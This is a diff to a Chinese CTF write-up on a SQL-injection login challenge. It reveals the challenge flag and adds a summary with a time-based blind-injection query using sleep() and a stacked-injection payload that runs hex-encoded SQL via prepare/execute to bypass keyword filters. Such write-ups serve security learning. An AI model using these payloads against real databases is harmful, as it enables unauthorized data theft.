@@ -14,7 +14,7 @@ Date: 2020-12-18
 3. 与[sql注入-1](./sql注入-1.md)原理相同，判断出用户名处存在字符型sql注入
     ![](./images/sql2-1.png)   
     ![](./images/sql2-2.png)
-4. 进一步发现union select注入，由于不展示select到的值，有两个结果作为返回值，开始写脚本进行盲注。
+4. 进一步发现union select注入，由于不展示select到的值，有两个结果作为返回值，开始写脚本进行报错注入。
 ```python
 # -*- coding: utf-8 -*-
 # @Date    : 2020-12-18
@@ -67,3 +67,15 @@ for i in range(1,50):
 # n1book{login_sqli_is_nice}
 
 ```
+
+## 总结
+这道题算是简单题，只对select进行了过滤，而且只是基于报错的注入。现在来扩宽一下sql注入的难度
+- 关键字过滤
+    - select、union、sleep、information_schema
+    - table、and、or
+- 时间盲注需要用到sleep(n)，盲注通用语句
+    - `sql="select(if(ascii(mid((select group_concat(schema_name) from information_schema.schemata),{},1))={},sleep(3),0))".format(str(num), str(ord(char)))`
+进一步的关键字都被过滤，时间盲注关键字也无效，考虑SQL语句的转码。使用**堆叠注入**的方式执行**16进制编码的SQL语句**。
+通用payload如下
+    - `1';set @x=16进制SQL语句;prepare a from @x;execute a;#`
+    - 注意`16进制SQL语句`前面需要加`0x`
